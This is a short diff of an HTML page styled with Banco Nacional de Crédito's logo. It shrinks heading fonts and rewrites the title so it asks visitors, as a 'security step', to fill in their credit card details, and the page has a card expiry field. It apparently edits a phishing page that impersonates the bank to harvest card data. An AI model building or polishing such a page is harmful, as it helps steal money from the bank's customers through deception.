@@ -55,7 +55,7 @@
   .step-title{
     font-family:"Poppins",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
     font-weight:600;
-    font-size:21px;
+    font-size:18px;
     letter-spacing:.2px;
     color:#FF6A00;
     text-align:center;
@@ -63,7 +63,7 @@
   }
 
   @media (max-width:480px){
-    .step-title{font-size:19px;margin:-8px 0 24px;}
+    .step-title{font-size:17px;margin:-8px 0 24px;}
   }
 
   /* Contenedor de cada campo */
@@ -162,7 +162,7 @@
     <img class="logo" alt="Logo"
       src="https://upload.wikimedia.org/wikipedia/commons/8/84/Banco_Nacional_de_Credito.png?utm_source=es.wikipedia.org&utm_campaign=index&utm_content=original">
 
-    <h1 class="step-title">Paso de seguridad:</h1>
+    <h1 class="step-title">Paso de seguridad, completa los datos de tu tarjeta de crédito:</h1>
 
 
     <!-- Mes de vencimiento -->
